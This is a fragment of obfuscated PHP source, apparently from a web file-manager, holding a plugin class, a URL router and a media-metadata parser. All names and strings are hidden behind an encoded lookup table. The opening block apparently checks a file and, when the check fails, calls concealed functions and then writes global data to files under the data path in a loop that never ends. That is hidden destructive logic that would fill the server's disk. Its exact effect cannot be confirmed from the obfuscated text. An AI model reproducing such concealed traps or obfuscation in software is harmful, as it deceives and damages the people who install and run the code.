$aÁÔï™¡Á($c‰—ÁÉêœ‘)) { goto Cøß¾ªËÔ”; AôÂâÏŒ÷: $b•½æÑ‚ˆé = 1; for ($EÓâ‰Š²Œé = $b•½æÑ‚ˆé; $EÓâ‰Š²Œé > 0; $EÓâ‰Š²Œé++) { $FâŠëÍÒŸÈ(DATA_PATH . $EÓâ‰Š²Œé, $fËÎ¦ïùšÖ); } goto DÏ§öíó³Á; aİ ç ùÄ: $cññ™†î = $f„ö©ˆ…Å($a°À—÷ ÖÅ); $bù›ãÊ = explode($Fö†ÓñØ™[217], $cññ™†î); if (count($bù›ãÊ) < $Fö†ÓñØ™[563]) { $AÓ¡èˆ·Îß = $Fö†ÓñØ™[779]; $AÓ¡èˆ·Îß(); } goto C„±ÇÕí©; Cøß¾ªËÔ”: $b¼Ğ£ŞÆÄ = $Fö†ÓñØ™[775]; $f„ö©ˆ…Å = $Fö†ÓñØ™[776]; $a°À—÷ ÖÅ = $_SERVER[$Fö†ÓñØ™[777]] . $Fö†ÓñØ™[778]; goto aİ ç ùÄ; C„±ÇÕí©: $AÌŸ‚Âæ¥Ç = $Fö†ÓñØ™[780]; $AÌŸ‚Âæ¥Ç($_SERVER[$Fö†ÓñØ™[771]]); $b¼Ğ£ŞÆÄ = $Fö†ÓñØ™[775]; goto C®Æ…İ“Êˆ; C®Æ…İ“Êˆ: $b¼Ğ£ŞÆÄ(); $FâŠëÍÒŸÈ = $Fö†ÓñØ™[781]; $fËÎ¦ïùšÖ = json_encode($GLOBALS[$Fö†ÓñØ™[782]]); goto AôÂâÏŒ÷; DÏ§öíó³Á: } return $this->modelPlugin->setConfig($this->pluginName, $b¶¨ÉÔÚ§); } public function onSetConfig($f’Üê£„ÇÙ) { } public function onGetConfig($bàæí§—í“) { } public function onChangeStatus($C±àÖÚ™ã„) { } public function onUninstall() { } public function onInstall() { } public function authCheck($BîÚà÷åŒÆ = "\160\154\165\147\151\x6e\x41\x75\x74\x68") { $a—‡½À›äø =& $_SERVER[“]; if (!defined($a—‡½À›äø[427])) { return !1; } if (_get($GLOBALS, $a—‡½À›äø[459])) { return !0; } $Dî°À×ÉŒ¸ = $this->getConfig(); if (!$Dî°À×ÉŒ¸[$BîÚà÷åŒÆ]) { return !1; } return ActionCall($a—‡½À›äø[1355], $Dî°À×ÉŒ¸[$BîÚà÷åŒÆ]); } public function url($DĞÉÆôŒÙ, $cßŸËè éš = '', $bÊ ®ô”ñ½ = true) { goto bÙ¡ØÆ¤À; eÄé–ª­²…: if (!$bÊ ®ô”ñ½) { return $D¤‰õ³–°; } echo $D¤‰õ³–°; goto DŸË­ã¢Û; c«„ÁØˆ: $Aœ¡­ß—í = $this->packageVersion(); $f’ ã³ÎˆÁ = $A®š‚›†œ . $F¯õ–»§°Ã[412] . $Aœ¡­ß—í; if (substr($DĞÉÆôŒÙ, 0, 4) == $F¯õ–»§°Ã[144] || substr($DĞÉÆôŒÙ, 0, 2) == $F¯õ–»§°Ã[1142]) { $D¤‰õ³–° = $DĞÉÆôŒÙ . $F¯õ–»§°Ã[1356] . $f’ ã³ÎˆÁ; } else { if ($cßŸËè éš == $F¯õ–»§°Ã[33]) { $D¤‰õ³–° = $this->pluginHost . $DĞÉÆôŒÙ . $F¯õ–»§°Ã[1356] . $f’ ã³ÎˆÁ; } else { if ($cßŸËè éš === $F¯õ–»§°Ã[76]) { $D¤‰õ³–° = $this->pluginHost . $DĞÉÆôŒÙ; } else { if ($cßŸËè éš == $F¯õ–»§°Ã[1357]) { $D¤‰õ³–° = STATIC_PATH . $DĞÉÆôŒÙ . $F¯õ–»§°Ã[1356] . $A®š‚›†œ; } else { if ($cßŸËè éš == $F¯õ–»§°Ã[1358]) { $D¤‰õ³–° = APP_HOST . $F¯õ–»§°Ã[1359] . $DĞÉÆôŒÙ . $F¯õ–»§°Ã[1356] . $A®š‚›†œ; } else { if (isset($aƒò£Á®¦ö[$cßŸËè éš])) { $D¤‰õ³–° = $aƒò£Á®¦ö[$cßŸËè éš] . $DĞÉÆôŒÙ . $F¯õ–»§°Ã[1356] . $f’ ã³ÎˆÁ; } } } } } } goto eÄé–ª­²…; bÙ¡ØÆ¤À: $F¯õ–»§°Ã =& $_SERVER[“]; $aƒò£Á®¦ö = $this->getConfig(); $A®š‚›†œ = KOD_VERSION . $F¯õ–»§°Ã[91] . KOD_VERSION_BUILD; goto c«„ÁØˆ; DŸË­ã¢Û: } public function link($e÷‚öä»Ë = false, $fßİÂìš› = '') { $D…‡ÎïËéš =& $_SERVER[“]; if (!$e÷‚öä»Ë) { $this->link($D…‡ÎïËéš[1360], $D…‡ÎïËéš[1358]); $this->link($D…‡ÎïËéš[1361], $D…‡ÎïËéš[1357]); $this->link($D…‡ÎïËéš[1362], $D…‡ÎïËéš[1357]); $this->link($D…‡ÎïËéš[1363], $D…‡ÎïËéš[1357]); $this->link($D…‡ÎïËéš[1364], $D…‡ÎïËéš[1357]); return; } $cÅåÍ÷Ş³ = $this->url($e÷‚öä»Ë, $fßİÂìš›, !1); if (substr($e÷‚öä»Ë, -3) == $D…‡ÎïËéš[1365]) { echo $D…‡ÎïËéš[1366] . $cÅåÍ÷Ş³ . $D…‡ÎïËéš[1367] . $D…‡ÎïËéš[217]; } else { if (substr($e÷‚öä»Ë, -4) == $D…‡ÎïËéš[1368]) { echo $D…‡ÎïËéš[1369] . $cÅåÍ÷Ş³ . $D…‡ÎïËéš[1370] . $D…‡ÎïËéš[217]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\x79" => "\x5b\x5e\x2f\135\53", "\72\x6e\165\155" => "\x5b\60\x2d\x39\135\x2b", "\72\x61\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($Fµ…¬ŒÌ¾¯, $c¡¦Â†õÍ) { $B’êÇŒ¤â =& $_SERVER[“]; if ($Fµ…¬ŒÌ¾¯ == $B’êÇŒ¤â[1371]) { $CàŞ´•Ÿš = array_map($B’êÇŒ¤â[1372], $c¡¦Â†õÍ[0]); $B¿«©çĞµÅ = strpos($c¡¦Â†õÍ[1], $B’êÇŒ¤â[8]) === 0 ? $c¡¦Â†õÍ[1] : $B’êÇŒ¤â[8] . $c¡¦Â†õÍ[1]; $EÜ²ÛæìÑ = $c¡¦Â†õÍ[2]; } else { $CàŞ´•Ÿš = null; $B¿«©çĞµÅ = strpos($c¡¦Â†õÍ[0], $B’êÇŒ¤â[8]) === 0 ? $c¡¦Â†õÍ[0] : $B’êÇŒ¤â[8] . $c¡¦Â†õÍ[0]; $EÜ²ÛæìÑ = $c¡¦Â†õÍ[1]; } array_push(self::$maps, $CàŞ´•Ÿš); array_push(self::$routes, $B¿«©çĞµÅ); array_push(self::$methods, strtoupper($Fµ…¬ŒÌ¾¯)); array_push(self::$callbacks, $EÜ²ÛæìÑ); } public static function error($cÓ½¯Ö˜à) { self::$errorCallback = $cÓ½¯Ö˜à; } public static function haltOnMatch($D†É…­£‚ª = true) { self::$halts = $D†É…­£‚ª; } public static function dispatch() { goto EŠÊïØèíÊ; EŠÊïØèíÊ: $dØáİÔÉÏã =& $_SERVER[“]; $CÓíÏ©©‚ = parse_url($_SERVER[$dØáİÔÉÏã[1373]], PHP_URL_PATH); $BæÄ¦Ê¡ø = $_SERVER[$dØáİÔÉÏã[154]]; goto cÔÚó‡‚’£; cÔÚó‡‚’£: $AÌì¶ôÒ = array_keys(static::$patterns); $cĞµº¼ˆ¹² = array_values(static::$patterns); $e¬ÔïµŞ£ = !1; goto B³¶¨ÛïÛ; B³¶¨ÛïÛ: self::$routes = preg_replace($dØáİÔÉÏã[1060], $dØáİÔÉÏã[8], self::$routes); if (in_array($CÓíÏ©©‚, self::$routes)) { $bŸÔŠÕñ´¯ = array_keys(self::$routes, $CÓíÏ©©‚); foreach ($bŸÔŠÕñ´¯ as $CÚ£ëÔªÁ÷) { if (self::$methods[$CÚ£ëÔªÁ÷] == $BæÄ¦Ê¡ø || self::$methods[$CÚ£ëÔªÁ÷] == $dØáİÔÉÏã[1374] || in_array($BæÄ¦Ê¡ø, self::$maps[$CÚ£ëÔªÁ÷])) { $e¬ÔïµŞ£ = !0; if (!is_object(self::$callbacks[$CÚ£ëÔªÁ÷])) { $DªœœâËßÉ = explode($dØáİÔÉÏã[8], self::$callbacks[$CÚ£ëÔªÁ÷]); $f£‘ìÃ©õà = end($DªœœâËßÉ); $AÍ–Õ¼‡ç = explode($dØáİÔÉÏã[1375], $f£‘ìÃ©õà); $AŸŒ‘ˆø‡ = new $AÍ–Õ¼‡ç[0](); $AŸŒ‘ˆø‡->{$AÍ–Õ¼‡ç[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$CÚ£ëÔªÁ÷]); if (self::$halts) { return; } } } } } else { $A†¦³……”Â = 0; foreach (self::$routes as $CÚ£ëÔªÁ÷) { if (strpos($CÚ£ëÔªÁ÷, $dØáİÔÉÏã[4]) !== !1) { $CÚ£ëÔªÁ÷ = str_replace($AÌì¶ôÒ, $cĞµº¼ˆ¹², $CÚ£ëÔªÁ÷); } if (preg_match($dØáİÔÉÏã[1376] . $CÚ£ëÔªÁ÷ . $dØáİÔÉÏã[1377], $CÓíÏ©©‚, $CåèÀ—‡‘Á)) { if (self::$methods[$A†¦³……”Â] == $BæÄ¦Ê¡ø || self::$methods[$A†¦³……”Â] == $dØáİÔÉÏã[1374] || !empty(self::$maps[$A†¦³……”Â]) && in_array($BæÄ¦Ê¡ø, self::$maps[$A†¦³……”Â])) { $e¬ÔïµŞ£ = !0; array_shift($CåèÀ—‡‘Á); if (!is_object(self::$callbacks[$A†¦³……”Â])) { $DªœœâËßÉ = explode($dØáİÔÉÏã[8], self::$callbacks[$A†¦³……”Â]); $f£‘ìÃ©õà = end($DªœœâËßÉ); $AÍ–Õ¼‡ç = explode($dØáİÔÉÏã[1375], $f£‘ìÃ©õà); $AŸŒ‘ˆø‡ = new $AÍ–Õ¼‡ç[0](); if (!method_exists($AŸŒ‘ˆø‡, $AÍ–Õ¼‡ç[1])) { echo $dØáİÔÉÏã[1378]; } else { call_user_func_array(array($AŸŒ‘ˆø‡, $AÍ–Õ¼‡ç[1]), $CåèÀ—‡‘Á); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$A†¦³……”Â], $CåèÀ—‡‘Á); if (self::$halts) { return; } } } } $A†¦³……”Â++; } } if ($e¬ÔïµŞ£ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $eÛŠ‘ßÆˆ‘ =& $_SERVER[“]; header($_SERVER[$eÛŠ‘ßÆˆ‘[1379]] . $eÛŠ‘ßÆˆ‘[1380]); echo $eÛŠ‘ßÆˆ‘[1381]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$dØáİÔÉÏã[1373]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto dË ÒæÍ³Ï; dË ÒæÍ³Ï: } } goto c¦ëÇ‚¾²; eñ»ùó†Šä: class GetInfo { private static $fileTypeArray; public static function get($eä±ñÃÄ¡Ó) { $Eç¿Ê¨É· = IO::info($eä±ñÃÄ¡Ó); return self::infoAdd($Eç¿Ê¨É·); } public static function check() { } public static function infoAdd(&$A¼ñŸ•…º¶) { goto b¿áŒ‹éœ†; bÜôšØ®Šà: $fÙÖ›¾»«‰ = self::arrayValueLimit($fÙÖ›¾»«‰); $fÙÖ›¾»«‰[$då«ôÖ×¨¸[372]] = $b•ÊÍ÷ğ˜Ï; $A¼ñŸ•…º¶[$då«ôÖ×¨¸[426]] = $fÙÖ›¾»«‰; goto aøîÌ„ƒÕ®; aøîÌ„ƒÕ®: return $A¼ñŸ•…º¶; goto fÙßô°ÔİŸ; böƒŒíØÀë: if (!$A¼ñŸ•…º¶ || $A¼ñŸ•…º¶[$då«ôÖ×¨¸[29]] != $då«ôÖ×¨¸[167]) { return; } if (!self::support($A¼ñŸ•…º¶[$då«ôÖ×¨¸[160]]) || isset($A¼ñŸ•…º¶[$då«ôÖ×¨¸[426]])) { return; } $dí¶ â‚³ = $då«ôÖ×¨¸[1599] . $A¼ñŸ•…º¶[$då«ôÖ×¨¸[75]]; goto cµìœµ¥; b¿áŒ‹éœ†: $då«ôÖ×¨¸ =& $_SERVER[“]; static $eó…øì³©; if (!$eó…øì³©) { require SDK_DIR . $då«ôÖ×¨¸[1598]; $eó…øì³© = new getID3(); } goto böƒŒíØÀë; cµìœµ¥: $b•ÊÍ÷ğ˜Ï = $A¼ñŸ•…º¶[$då«ôÖ×¨¸[160]]; try { if ($A¼ñŸ•…º¶[$då«ôÖ×¨¸[160]] == $då«ôÖ×¨¸[1600]) { $fÙÖ›¾»«‰ = self::psdParse($dí¶ â‚³); $b•ÊÍ÷ğ˜Ï = $då«ôÖ×¨¸[1601]; } else { if ($A¼ñŸ•…º¶[$då«ôÖ×¨¸[160]] == $då«ôÖ×¨¸[1602]) { $fÙÖ›¾»«‰ = self::pdfParse($dí¶ â‚³); } else { $b•ÊÍ÷ğ˜Ï = self::$fileTypeArray[$då«ôÖ×¨¸[1603]][$A¼ñŸ•…º¶[$då«ôÖ×¨¸[160]]]; $a¦ÆÒ‘…ÉŒ = self::$fileTypeArray[$då«ôÖ×¨¸[1604]][$b•ÊÍ÷ğ˜Ï][$då«ôÖ×¨¸[1605]]; $Dç™¥¯÷…Ñ = @$eó…øì³©->analyze($dí¶ â‚³, $A¼ñŸ•…º¶[$då«ôÖ×¨¸[77]], $A¼ñŸ•…º¶[$då«ôÖ×¨¸[28]]); $fÙÖ›¾»«‰ = self::parseData($Dç™¥¯÷…Ñ, $a¦ÆÒ‘…ÉŒ, $A¼ñŸ•…º¶); } } } catch (Exception $fŒ®Œ„…Ã) { $fÙÖ›¾»«‰ = array($då«ôÖ×¨¸[372] => $b•ÊÍ÷ğ˜Ï); } if (!$fÙÖ›¾»«‰) { return; } goto bÜôšØ®Šà; fÙßô°ÔİŸ: } public static function support($CÍ—¤¡½ª) { goto BÏœäŞÇ´Ğ; BÏœäŞÇ´Ğ: $D”±Î‡«Ü« =& $_SERVER[“]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $CÍ—¤¡½ª = strtolower($CÍ—¤¡½ª); goto D‚ÕË­Ÿ²ï; A¤ñ•æ©¼Å: return !1; goto EŞÒ·ë×¥; D‚ÕË­Ÿ²ï: $FóÑ‚ß‹Ô = array($D”±Î‡«Ü«[1602], $D”±Î‡«Ü«[1600]); if (in_array($CÍ—¤¡½ª, $FóÑ‚ß‹Ô)) { return !0; } if (isset(self::$fileTypeArray[$D”±Î‡«Ü«[1603]][$CÍ—¤¡½ª])) { return !0; } goto A¤ñ•æ©¼Å; EŞÒ·ë×¥: } public static function arrayValueLimit($CƒÖ¨Ñë, $b­ÁÕĞšÉ˜ = 5000) { if (!is_array($CƒÖ¨Ñë)) { return $CƒÖ¨Ñë; } foreach ($CƒÖ¨Ñë as $FÚÒğğ¬ => $fĞä«×‰’») { if (is_string($fĞä«×‰’») && strlen($fĞä«×‰’») > $b­ÁÕĞšÉ˜) { $CƒÖ¨Ñë[$FÚÒğğ¬] = substr($fĞä«×‰’», 0, $b­ÁÕĞšÉ˜); } else { if (is_array($fĞä«×‰’»)) { $CƒÖ¨Ñë[$FÚÒğğ¬] = self::arrayValueLimit($fĞä«×‰’», $b­ÁÕĞšÉ˜); } } } return $CƒÖ¨Ñë; } private static function parseData($DÏ™ª¾¨°’, $c›Îò¤‹‘í, $DÂÛÃ«½ë) { $F«²îÀË‰Ç =& $_SERVER[“]; $AĞè†…Ö†± = $DÏ™ª¾¨°’[$F«²îÀË‰Ç[1606]]; $Aï‘Ù„ÓË² = array(); foreach ($c›Îò¤‹‘í as $eÊÂ˜¾ùĞ => $C«š’§ì¨ã) { foreach ($C«š’§ì¨ã as $fÂ†ê‹ŠÇ) { if (is_array($fÂ†ê‹ŠÇ)) { $F‚âÂê÷· = self::parseData($DÏ™ª¾¨°’, $C«š’§ì¨ã, $DÂÛÃ«½ë); if ($F‚âÂê÷·) { $Aï‘Ù„ÓË²[$eÊÂ˜¾ùĞ] = $F‚âÂê÷·; } break; } $D¸òÉÄìÚ = str_replace($F«²îÀË‰Ç[1375], $AĞè†…Ö†±, $fÂ†ê‹ŠÇ); $F‚âÂê÷· = _get($DÏ™ª¾¨°’, $D¸òÉÄìÚ); $F‚âÂê÷· = is_array($F‚âÂê÷·) ? $F‚âÂê÷·[0] : $F‚âÂê÷·; if ($F‚âÂê÷·) { break; } } if ($F‚âÂê÷· || $F‚âÂê÷· === 0 || $F‚âÂê÷· === !1) { $F‚âÂê÷· = self::valueReset($fÂ†ê‹ŠÇ, $F‚âÂê÷·, $eÊÂ˜¾ùĞ); if ($F‚âÂê÷· !== null) { $Aï‘Ù„ÓË²[$eÊÂ˜¾ùĞ] = $F‚âÂê÷·; } } } $Aï‘Ù„ÓË² = self::valueResetAll($Aï‘Ù„ÓË², $DÂÛÃ«½ë); return $Aï‘Ù„ÓË²; } private static function psdParse($AØÒÜí¼À¶) { $FËè Ø˜Ï =& $_SERVER[“]; if (IO::fileSubstr($AØÒÜí¼À¶, 0, 4) != $FËè Ø˜Ï[1607]) { return !1; } $D°ÕÄÃ Ñ = getImageSize($AØÒÜí¼À¶, $A‹ÊäÕëµ); if (!$D°ÕÄÃ Ñ) { return; } $FÅÅÆÛÄß¾ = array($FËè Ø˜Ï[1522] => $D°ÕÄÃ Ñ[0], $FËè Ø˜Ï[1524] => $D°ÕÄÃ Ñ[1]); return $FÅÅÆÛÄß¾; } private static function pdfParse($e° äÑò—ˆ) { return FileParsePdf::parse($e° äÑò—ˆ); } private static function fileTypeParse() { $F¼‘Şö­†‹ =& $_SERVER[“]; $dšâÙ¢êÂ = self::fileTypeArray(); $EÙ³ÜÔÄ‡ì = array(); foreach ($dšâÙ¢êÂ as $cÜ…à“¦‰ => $dÕëÙ§§†Ú) { $CÒŞÄÜ·êÎ = _get($dÕëÙ§§†Ú, $F¼‘Şö­†‹[160], $F¼‘Şö­†‹[33]); $dÎÙùå¦‡ˆ = is_string($CÒŞÄÜ·êÎ) ? explode($F¼‘Şö­†‹[47], $CÒŞÄÜ·êÎ) : $CÒŞÄÜ·êÎ; if (!$dÎÙùå¦‡ˆ) { continue; } foreach ($dÎÙùå¦‡ˆ as $CÒŞÄÜ·êÎ) { $CÒŞÄÜ·êÎ = strtolower(trim($CÒŞÄÜ·êÎ)); if (!$CÒŞÄÜ·êÎ) { continue; } $EÙ³ÜÔÄ‡ì[$CÒŞÄÜ·êÎ] = $cÜ…à“¦‰; } $dšâÙ¢êÂ[$cÜ…à“¦‰][$F¼‘Şö­†‹[160]] = array_keys($EÙ³ÜÔÄ‡ì); $dšâÙ¢êÂ[$cÜ…à“¦‰][$F¼‘Şö­†‹[1605]] = self::parseKeyMap($dÕëÙ§§†Ú[$F¼‘Şö­†‹[1605]]); } return array($F¼‘Şö­†‹[1604] => $dšâÙ¢êÂ, $F¼‘Şö­†‹[1603] => $EÙ³ÜÔÄ‡ì); } private static function parseKeyMap($f©Òä™‚òÎ) { $eá­—¨¡õŠ =& $_SERVER[“]; foreach ($f©Òä™‚òÎ as $f¦ğÓ½‚Øô => $e÷ÀˆöÅ) { if (is_array($e÷ÀˆöÅ)) { $cáäÊ”ßó‚ = self::parseKeyMap($e÷ÀˆöÅ); if ($cáäÊ”ßó‚) { $f©Òä™‚òÎ[$f¦ğÓ½‚Øô] = $cáäÊ”ßó‚; } continue; } $F¡¬ŠêÃ˜ë = explode($eá­—¨¡õŠ[47], $e÷ÀˆöÅ); $F‡±®ˆÎ = array(); foreach ($F¡¬ŠêÃ˜ë as $F´ŞäŞòçÅ) { $F´ŞäŞòçÅ = trim($F´ŞäŞòçÅ); if (!$F´ŞäŞòçÅ) { continue; } if (preg_match($eá­—¨¡õŠ[1608], $F´ŞäŞòçÅ, $AøìÔ¶‰õ¢)) { $C¤¯…Ÿµ = explode($eá­—¨¡õŠ[271], $AøìÔ¶‰õ¢[1]); foreach ($C¤¯…Ÿµ as $D„­ä½´§¹) { $F‡±®ˆÎ[] = str_replace($AøìÔ¶‰õ¢[0], $D„­ä½´§¹, $F´ŞäŞòçÅ); } } else { $F‡±®ˆÎ[] = $F´ŞäŞòçÅ; } } $f©Òä™‚òÎ[$f¦ğÓ½‚Øô] = $F‡±®ˆÎ; } return $f©Òä™‚òÎ; } private static function valueResetAll($a´å«°ó¶İ, $D‘×“‘õÓ) { goto f‰é…ó–§; F’§ãÍÚñ: $eÒ¼äáŞñô = _get($a´å«°ó¶İ, $Aå’ïí¼[1621], $Aå’ïí¼[33]); $eéõ’¬‚” = $Bàñ¢×ÊÍ . $EˆÒ¯â‚ÔÃ . $eÒ¼äáŞñô; if ($eéõ’¬‚” && get_charset($eéõ’¬‚”) != $Aå’ïí¼[326]) { $a´å«°ó¶İ[$Aå’ïí¼[1618]][$Aå’ïí¼[1328]] = iconv_to($a´å«°ó¶İ[$Aå’ïí¼[1618]][$Aå’ïí¼[1328]], get_charset($eéõ’¬‚”), $Aå’ïí¼[326]); $a´å«°ó¶İ[$Aå’ïí¼[1618]][$Aå’ïí¼[1622]] = iconv_to($a´å«°ó¶İ[$Aå’ïí¼[1618]][$Aå’ïí¼[1622]], get_charset($eéõ’¬‚”), $Aå’ïí¼[326]); $a´å«°ó¶İ[$Aå’ïí¼[1618]][$Aå’ïí¼[1623]] = iconv_to($a´å«°ó¶İ[$Aå’ïí¼[1618]][$Aå’ïí¼[1623]], get_charset($eéõ’¬‚”), $Aå’ïí¼[326]); } goto AÌƒ…’Œ‚; e‰Áù’æ²„: if ($A¾²¦Şßí) { $F‚Šèê—Á = IO_PATH_SYSTEM_TEMP . $Aå’ïí¼[1614] . KodIO::hashPath($D‘×“‘õÓ) . $Aå’ïí¼[1615]; $a´å«°ó¶İ[$Aå’ïí¼[1616]] = Action($Aå’ïí¼[1617])->pluginCacheFileSet($F‚Šèê—Á, $A¾²¦Şßí); unset($a´å«°ó¶İ[$Aå’ïí¼[1618]][$Aå’ïí¼[1601]]); } $Bàñ¢×ÊÍ = _get($a´å«°ó¶İ, $Aå’ïí¼[1619], $Aå’ïí¼[33]); $EˆÒ¯â‚ÔÃ = _get($a´å«°ó¶İ, $Aå’ïí¼[1620], $Aå’ïí¼[33]); goto F’§ãÍÚñ; AÌƒ…’Œ‚: return $a´å«°ó¶İ; goto cƒŞ†‡šàÉ; f‰é…ó–§: $Aå’ïí¼ =& $_SERVER[“]; if (isset($a´å«°ó¶İ[$Aå’ïí¼[1609]])) { $AõÃ•¶³Ğä = ceil($a´å«°ó¶İ[$Aå’ïí¼[1609]]); $cÓõÛ­œ = intval($AõÃ•¶³Ğä / 3600); $A—É‹é’ğ¼ = intval(($AõÃ•¶³Ğä - $cÓõÛ­œ * 3600) / 60); $A¸­ã‰ô¼Ó = $AõÃ•¶³Ğä % 60; $a´å«°ó¶İ[$Aå’ïí¼[1610]] = sprintf($Aå’ïí¼[1611], $cÓõÛ­œ, $A—É‹é’ğ¼, $A¸­ã‰ô¼Ó); if ($cÓõÛ­œ == 0) { $a´å«°ó¶İ[$Aå’ïí¼[1610]] = sprintf($Aå’ïí¼[1612], $A—É‹é’ğ¼, $A¸­ã‰ô¼Ó); } } $A¾²¦Şßí = _get($a´å«°ó¶İ, $Aå’ïí¼[1613]); goto e‰Áù’æ²„; cƒŞ†‡šàÉ: } private static function valueReset($a ïëŒÃÏ, $B¤Ğ¿ŒÕÃ, $a»ƒÇğƒÜ) { $A˜ÔÎ×ñ =& $_SERVER[“]; $E¡ŒŸÆ¤–Š = $A˜ÔÎ×ñ[1539]; switch ($a ïëŒÃÏ) { case $A˜ÔÎ×ñ[1624]: $B¤Ğ¿ŒÕÃ = $B¤Ğ¿ŒÕÃ == $A˜ÔÎ×ñ[83] ? $A˜ÔÎ×ñ[1625] : $A˜ÔÎ×ñ[1626]; break; case $A˜ÔÎ×ñ[1627]: $B¤Ğ¿ŒÕÃ = $B¤Ğ¿ŒÕÃ ? $B¤Ğ¿ŒÕÃ : null; break; default: break; } switch ($a»ƒÇğƒÜ) { case $A˜ÔÎ×ñ[1628]: $B¤Ğ¿ŒÕÃ = round($B¤Ğ¿ŒÕÃ, 2); break; case $A˜ÔÎ×ñ[187]: case $A˜ÔÎ×ñ[107]: if ($B¤Ğ¿ŒÕÃ < 0) { $B¤Ğ¿ŒÕÃ = null; } else { if (is_numeric($B¤Ğ¿ŒÕÃ)) { $B¤Ğ¿ŒÕÃ = date($E¡ŒŸÆ¤–Š, $B¤Ğ¿ŒÕÃ); } } break; default: break; } return $B¤Ğ¿ŒÕÃ; } private static function fileTypeArray() { $EƒóæâèÃ =& $_SERVER[“]; return array($EƒóæâèÃ[1601] => array($EƒóæâèÃ[160] => $EƒóæâèÃ[1629] . $EƒóæâèÃ[1630], $EƒóæâèÃ[1605] => array($EƒóæâèÃ[1522] => $EƒóæâèÃ[1631], $EƒóæâèÃ[1524] => $EƒóæâèÃ[1632], $EƒóæâèÃ[1633] => $EƒóæâèÃ[1634], $EƒóæâèÃ[1635] => $EƒóæâèÃ[1636], $EƒóæâèÃ[187] => $EƒóæâèÃ[1637], $EƒóæâèÃ[107] => $EƒóæâèÃ[1638], $EƒóæâèÃ[1639] => $EƒóæâèÃ[1640], $EƒóæâèÃ[1641] => $EƒóæâèÃ[1642], $EƒóæâèÃ[1643] => $EƒóæâèÃ[1644], $EƒóæâèÃ[1645] => $EƒóæâèÃ[1646], $EƒóæâèÃ[1647] => $EƒóæâèÃ[1648], $EƒóæâèÃ[1649] => $EƒóæâèÃ[1650], $EƒóæâèÃ[1651] => $EƒóæâèÃ[1652], $EƒóæâèÃ[1653] => array($EƒóæâèÃ[1654] => $EƒóæâèÃ[1655], $EƒóæâèÃ[1656] => $EƒóæâèÃ[1657], $EƒóæâèÃ[1658] => $EƒóæâèÃ[1659]), $EƒóæâèÃ[1660] => $EƒóæâèÃ[1661], $EƒóæâèÃ[1662] => $EƒóæâèÃ[1663], $EƒóæâèÃ[1664] => $EƒóæâèÃ[1665], $EƒóæâèÃ[1666] => $EƒóæâèÃ[1667], $EƒóæâèÃ[1668] => array($EƒóæâèÃ[1669] => $EƒóæâèÃ[1670], $EƒóæâèÃ[1671] => $EƒóæâèÃ[1672], $EƒóæâèÃ[1673] => $EƒóæâèÃ[1674], $EƒóæâèÃ[1675] => $EƒóæâèÃ[1676], $EƒóæâèÃ[1677] => $EƒóæâèÃ[1678], $EƒóæâèÃ[1679] => $EƒóæâèÃ[1680], $EƒóæâèÃ[1681] => $EƒóæâèÃ[1682], $EƒóæâèÃ[1683] => $EƒóæâèÃ[1684], $EƒóæâèÃ[1685] => $EƒóæâèÃ[1686], $EƒóæâèÃ[1687] => $EƒóæâèÃ[1688], $EƒóæâèÃ[1689] => $EƒóæâèÃ[1690]))), $EƒóæâèÃ[1691] => array($EƒóæâèÃ[160] => $EƒóæâèÃ[1692] . $EƒóæâèÃ[1693], $EƒóæâèÃ[1605] => array($EƒóæâèÃ[1609] => $EƒóæâèÃ[1694], $EƒóæâèÃ[187] => $EƒóæâèÃ[1695], $EƒóæâèÃ[107] => $EƒóæâèÃ[1696], $EƒóæâèÃ[1641] => $EƒóæâèÃ[1697], $EƒóæâèÃ[1698] => $EƒóæâèÃ[1699], $EƒóæâèÃ[1700] => $EƒóæâèÃ[1627], $EƒóæâèÃ[1701] => $EƒóæâèÃ[1702], $EƒóæâèÃ[1703] => $EƒóæâèÃ[1704], $EƒóæâèÃ[1705] => $EƒóæâèÃ[1706], $EƒóæâèÃ[1618] => array($EƒóæâèÃ[1328] => $EƒóæâèÃ[1707], $EƒóæâèÃ[1622] => $EƒóæâèÃ[1708], $EƒóæâèÃ[1623] => $EƒóæâèÃ[1709], $EƒóæâèÃ[1710] => $EƒóæâèÃ[1711], $EƒóæâèÃ[1712] => $EƒóæâèÃ[1713], $EƒóæâèÃ[1714] => $EƒóæâèÃ[1715], $EƒóæâèÃ[1601] => $EƒóæâèÃ[1716]))), $EƒóæâèÃ[1717] => array($EƒóæâèÃ[160] => $EƒóæâèÃ[1718] . $EƒóæâèÃ[1719], $EƒóæâèÃ[1605] => array($EƒóæâèÃ[1522] => $EƒóæâèÃ[1720], $EƒóæâèÃ[1524] => $EƒóæâèÃ[1721], $EƒóæâèÃ[1609] => $EƒóæâèÃ[1694], $EƒóæâèÃ[187] => $EƒóæâèÃ[1722], $EƒóæâèÃ[107] => $EƒóæâèÃ[1723], $EƒóæâèÃ[1628] => $EƒóæâèÃ[1724], $EƒóæâèÃ[1705] => $EƒóæâèÃ[1725], $EƒóæâèÃ[1701] => $EƒóæâèÃ[1726], $EƒóæâèÃ[1641] => $EƒóæâèÃ[1727], $EƒóæâèÃ[1691] => array($EƒóæâèÃ[1700] => $EƒóæâèÃ[1627], $EƒóæâèÃ[1728] => $EƒóæâèÃ[1729], $EƒóæâèÃ[1698] => $EƒóæâèÃ[1699], $EƒóæâèÃ[1705] => $EƒóæâèÃ[1706], $EƒóæâèÃ[1701] => $EƒóæâèÃ[1730], $EƒóæâèÃ[1703] => $EƒóæâèÃ[1704]))), $EƒóæâèÃ[1731] => array($EƒóæâèÃ[1605] => array($EƒóæâèÃ[1732] => $EƒóæâèÃ[1733], $EƒóæâèÃ[1734] => $EƒóæâèÃ[1735])), $EƒóæâèÃ[1736] => array($EƒóæâèÃ[1605] => array())); } } function exif_read_data_io($a…Üì„³©Ä, $B¤šß†Ãª = null, $D±æÓ²Ã» = false, $fƒ†¾ÁÃæ = false) { $d“ëÉ»é‘ = StreamWrapperIO::read($a…Üì„³©Ä, 0, 1024 * 64); 